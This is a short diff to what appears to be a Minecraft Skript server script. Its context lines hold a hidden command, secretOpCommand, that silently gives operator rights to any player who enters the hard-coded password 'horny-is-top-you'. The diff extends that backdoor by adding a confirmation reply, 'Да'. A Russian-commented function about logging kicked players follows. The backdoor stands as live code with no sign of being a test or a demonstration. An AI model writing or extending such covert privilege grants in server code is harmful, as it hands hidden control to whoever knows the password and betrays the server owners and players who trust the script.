@@ -50,7 +50,7 @@ command secretOpCommand [<text>]:
   trigger:
     if arg 1 is "horny-is-top-you":
       op player
-
+      send "Да"
 
 function justifySentence(player: player, time: number, reason: string):
   # Запоминаем то, что мы кикнули этого игрока
